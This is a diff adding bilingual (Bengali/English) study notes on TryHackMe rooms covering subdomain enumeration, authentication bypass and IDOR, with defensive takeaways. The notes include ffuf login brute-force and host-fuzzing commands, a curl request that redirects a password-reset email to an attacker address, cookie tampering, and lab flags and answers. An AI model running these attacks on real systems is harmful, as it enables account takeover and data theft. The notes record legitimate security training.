@@ -1918,7 +1918,595 @@ Logs are high-value targets
 
 Content discovery = foundation of web pentesting
 
-
-
 Day 10
+Subdomain Enumeration
+
+(TryHackMe – Web Recon & Attack Surface Expansion)
+
+📌 Overview
+
+Subdomain Enumeration হলো একটি ডোমেইনের অধীনে থাকা সব valid subdomain খুঁজে বের করার প্রক্রিয়া।
+
+🎯 Why Do We Do This?
+
+Attack surface expand করার জন্য
+
+নতুন services / applications খুঁজে বের করার জন্য
+
+Hidden admin panels বা dev environments খুঁজে পাওয়ার জন্য
+
+Misconfiguration বা vulnerable systems খুঁজে বের করার জন্য
+
+🧭 Enumeration Methods Covered
+
+এই রুমে ৩টি প্রধান পদ্ধতি আলোচনা করা হয়েছে:
+
+Method	Description
+Brute Force	Wordlist দিয়ে DNS guessing
+OSINT	Public data sources ব্যবহার
+Virtual Host	Host header manipulation
+🧠 Task 1 – Enumeration Methods
+Q&A
+
+B → Brute Force
+
+O → OSINT
+
+V → Virtual Host
+
+🔐 Task 2 – OSINT: SSL/TLS Certificates
+📜 Certificate Transparency (CT Logs)
+
+যখন কোনো SSL/TLS certificate তৈরি হয়, সেটা Certificate Authority (CA) দ্বারা public log-এ সংরক্ষণ করা হয়।
+
+এই লগগুলো publically searchable।
+
+🔍 Tool Used
+https://crt.sh
+
+🎯 Technique
+
+Domain search করা
+
+Historical certificate entries দেখা
+
+Subdomain identify করা
+
+✅ Finding (Logged: 2020-12-26)
+store.tryhackme.com
+
+
+📌 Security Insight:
+Certificate logs প্রায়ই hidden subdomains expose করে।
+
+🔎 Task 3 – OSINT: Search Engines
+
+Search engines যেমন Google trillions of pages index করে।
+
+🛠️ Google Dork Used:
+site:*.tryhackme.com -site:www.tryhackme.com
+
+🎯 Result:
+store.tryhackme.com
+
+
+📌 Security Insight:
+Search engine indexing = free reconnaissance.
+
+🔨 Task 4 – DNS Bruteforce
+📡 What Is DNS Bruteforce?
+
+Common subdomain names wordlist থেকে নিয়ে DNS resolve হয় কিনা পরীক্ষা করা।
+
+Because it's noisy and involves many requests → automation দরকার।
+
+🛠️ Tool Used:
+dnsrecon
+
+🎯 Result:
+api.acmeitsupport.thm
+
+
+📌 Security Insight:
+API endpoints are common targets.
+
+⚙️ Task 5 – OSINT Automation: Sublist3r
+🧠 Sublist3r
+
+Sublist3r একটি OSINT automation tool যা ব্যবহার করে:
+
+Search engines
+
+SSL certificates
+
+Public datasets
+
+🎯 First Subdomain Found:
+web55.acmeitsupport.thm
+
+
+📌 Security Insight:
+Automation saves time and increases coverage.
+
+🧱 Task 6 – Virtual Host Enumeration
+🧠 What Are Virtual Hosts?
+
+একই IP address-এ একাধিক website host করা যায়।
+Server Host header দেখে decide করে কোন website serve করবে।
+
+কিছু subdomain:
+
+Public DNS-এ থাকে না
+
+Private DNS বা /etc/hosts-এ থাকে
+
+🛠️ Tool: ffuf (Host Header Fuzzing)
+Initial Command:
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt \
+-H "Host: FUZZ.acmeitsupport.thm" \
+-u http://MACHINE_IP
+
+Filtering False Positives:
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt \
+-H "Host: FUZZ.acmeitsupport.thm" \
+-u http://MACHINE_IP \
+-fs {size}
+
+
+-fs → filter responses by size
+
+🎯 Results Discovered
+Order	Subdomain
+1️⃣	delta
+2️⃣	yellow
+
+📌 Security Insight:
+Virtual host enumeration can reveal:
+
+Admin portals
+
+Dev environments
+
+Internal services
+
+🧠 Key Takeaways
+
+Subdomain enumeration expands attack surface significantly
+
+SSL certificates often leak subdomains
+
+Google dorking is powerful OSINT
+
+DNS brute force finds predictable names
+
+Sublist3r automates multiple OSINT sources
+
+Virtual Host fuzzing reveals DNS-hidden applications
+
+Always combine OSINT + Brute Force + Virtual Host
+
+📁 Suggested GitHub Structure
+Cyber-Security-101/
+└── Web-Application-Security/
+    ├── Content-Discovery.md
+    ├── Walking-An-Application.md
+    └── Subdomain-Enumeration.md
+
+Day 11
+Authentication Bypass
+
+(TryHackMe – Web Application Security)
+
+📌 Overview
+
+Authentication Bypass হলো এমন একটি vulnerability যেখানে attacker authentication process কে bypass করে:
+
+অন্য ব্যবহারকারীর account access করতে পারে
+
+Admin privileges নিতে পারে
+
+Password reset manipulate করতে পারে
+
+Cookies modify করে access বাড়াতে পারে
+
+🧠 Task 1 – Username Discovery
+Question:
+
+Username starting with ro****?
+
+✅ Answer:
+robert
+
+💥 Task 3 – Brute Force Attack
+📌 What Is Brute Force?
+
+Brute force হলো automated password guessing attack যেখানে:
+
+1টি username + অনেক password
+অথবা
+
+অনেক username + অনেক password
+
+test করা হয়।
+
+🛠️ Tool Used: ffuf
+Command:
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
+-X POST \
+-d "username=W1&password=W2" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-u http://MACHINE_IP/customers/login \
+-fc 200
+
+🔍 Explanation:
+Flag	Meaning
+-w	Multiple wordlists
+W1	Username list
+W2	Password list
+-X POST	POST request
+-d	POST data
+-fc 200	Filter responses with status 200
+🎯 Valid Credentials Found:
+steve/thunder
+
+
+📌 Security Insight:
+
+No rate limiting
+
+No account lockout
+
+No CAPTCHA
+= Brute force vulnerability
+
+🧠 Task 4 – Logic Flaw
+📌 What Is A Logic Flaw?
+
+Logic flaw হলো application logic-এর ভুল design যার মাধ্যমে attacker:
+
+Normal flow bypass করতে পারে
+
+Authentication manipulate করতে পারে
+
+⚠️ Example:
+if( url.substr(0,6) === '/admin') {
+    # Check admin privileges
+} else {
+    # Show page
+}
+
+
+Problem:
+/adMin bypass করবে case-sensitive check।
+
+🔥 Practical: Password Reset Exploit
+Vulnerability Root Cause:
+
+Email sent in GET parameter
+
+Username sent in POST parameter
+
+PHP uses $_REQUEST
+
+POST overrides GET
+
+🛠️ Exploit Concept:
+Normal Request:
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' \
+-H 'Content-Type: application/x-www-form-urlencoded' \
+-d 'username=robert'
+
+Manipulated Request:
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' \
+-H 'Content-Type: application/x-www-form-urlencoded' \
+-d 'username=robert&email=attacker@hacker.com'
+
+
+POST email overrides GET email.
+
+Password reset link attacker-controlled email-এ পাঠানো হয়।
+
+🎯 Final Flag:
+THM{AUTH_BYPASS_COMPLETE}
+
+
+📌 Security Insight:
+
+Never trust mixed GET + POST parameters
+
+Never use $_REQUEST
+
+Always validate ownership before reset
+
+🍪 Task 5 – Cookie Tampering
+
+Cookies modify করে privilege escalation করা যায়।
+
+🧾 Plain Text Cookie Example
+Set-Cookie: logged_in=true
+Set-Cookie: admin=false
+
+Change to:
+logged_in=true; admin=true
+
+🎯 Flag:
+THM{COOKIE_TAMPERING}
+
+🔐 Hash Cracking
+Question:
+
+MD5 hash:
+
+3b2a1053e3270077456a79192070aa78
+
+✅ Answer:
+463729
+
+
+📌 Tools:
+
+crackstation.net
+
+hashcat
+
+john the ripper
+
+🔓 Base64 Decoding
+Question:
+VEhNe0JBU0U2NF9FTkNPRElOR30=
+
+✅ Decoded:
+THM{BASE64_ENCODING}
+
+🔁 Base64 Encoding
+Encode:
+{"id":1,"admin":true}
+
+✅ Result:
+eyJpZCI6MSwiYWRtaW4iOnRydWV9
+
+🧠 Key Takeaways
+Attack Type	Root Cause
+Brute Force	No rate limiting
+Logic Flaw	Poor validation logic
+Password Reset	GET/POST parameter confusion
+Cookie Tampering	Trusting client-side data
+Hash Exploitation	Weak hashing
+Base64 Abuse	Encoding ≠ Security
+🛡️ Defensive Measures
+
+Rate limiting
+
+Account lockout
+
+Strong hashing (bcrypt, argon2)
+
+Never trust cookies
+
+Avoid $_REQUEST
+
+Validate ownership server-side
+
+Use secure password reset tokens
+
+📁 Suggested GitHub Structure
+Web-Application-Security/
+├── Authentication-Bypass.md
+├── Content-Discovery.md
+├── Subdomain-Enumeration.md
+└── Walking-An-Application.md
+
+Day 12
+IDOR (Insecure Direct Object Reference)
+📌 Overview
+
+IDOR (Insecure Direct Object Reference) is an Access Control Vulnerability where an application exposes a direct reference to internal objects (such as user IDs, files, or database records) without proper authorization checks.
+
+This vulnerability occurs when:
+
+The server trusts user-supplied input
+
+There is no server-side validation
+
+Users can access objects that don’t belong to them
+
+🧠 What is an IDOR?
+
+IDOR stands for:
+
+Insecure Direct Object Reference
+
+It happens when:
+
+/profile?user_id=1305
+
+
+If changing the ID:
+
+/profile?user_id=1000
+
+
+Shows another user’s data → 🚨 IDOR confirmed.
+
+The server should verify:
+
+Does this object belong to the logged-in user?
+
+If not → Access denied.
+
+🔎 Types of IDOR
+1️⃣ Basic IDOR (Direct ID Manipulation)
+Example:
+/profile?user_id=1305
+
+
+Changing ID gives access to another account.
+
+🔥 Flag:
+THM{IDOR-VULN-FOUND}
+
+2️⃣ IDOR in Encoded IDs
+
+Developers sometimes encode IDs using Base64.
+
+Example:
+
+MTIz
+
+
+Decoded:
+
+123
+
+
+Steps:
+
+Decode Base64
+
+Modify ID
+
+Re-encode
+
+Send request again
+
+Common Encoding:
+base64
+
+3️⃣ IDOR in Hashed IDs
+
+Sometimes IDs are hashed (e.g., md5).
+
+Example:
+
+123 → 202cb962ac59075b964b07152d234b70
+
+
+You can:
+
+Try cracking hash using crackstation
+
+Check for predictable pattern
+
+Common Hash Algorithm:
+md5
+
+4️⃣ IDOR Using Multiple Accounts
+
+If ID format is unpredictable:
+
+Best technique:
+
+Create 2 accounts
+
+Swap ID numbers
+
+Test access
+
+Minimum accounts required:
+
+2
+
+🧪 Practical Lab Example
+
+Endpoint discovered:
+
+/api/v1/customer?id={user_id}
+
+
+Using browser DevTools → Network tab
+We found JSON response with:
+
+id
+
+username
+
+email
+
+By changing ID:
+
+?id=1
+?id=3
+
+
+We accessed other users’ data.
+
+Results:
+
+User ID 1:
+
+adam84
+
+
+User ID 3 Email:
+
+j@fakemail.thm
+
+🎯 How to Find IDORs
+
+✔ Check query parameters
+✔ Inspect API endpoints
+✔ Analyze AJAX requests
+✔ Look inside JavaScript files
+✔ Perform parameter mining
+✔ Test ID swapping
+✔ Check cookies for ID references
+
+🛡️ How to Prevent IDOR
+
+Developers should:
+
+Implement proper server-side access control
+
+Never trust client input
+
+Use indirect object references
+
+Validate ownership before returning data
+
+Use UUID instead of incremental IDs
+
+Apply Role-Based Access Control (RBAC)
+
+🚨 Real-World Impact
+
+IDOR can lead to:
+
+Data leakage
+
+Account takeover
+
+Financial fraud
+
+Privacy violation
+
+GDPR penalties
+
+🧩 Key Takeaways
+
+Access control must be enforced server-side
+
+Encoding ≠ Security
+
+Hashing ≠ Authorization
+
+Always verify object ownership
+
+API endpoints are common IDOR targets
+
+📚 Exam / Interview Quick Q&A
+
+Q: What does IDOR stand for?
+A: Insecure Direct Object Reference
+
+Q: Is Base64 secure?
+A: No, it is reversible encoding.
+
+Q: How to test IDOR quickly?
+A: Change ID parameter and observe response.
+
+Q: How to prevent IDOR?
+A: Enforce server-side authorization checks.
+
+Day 13
+
 
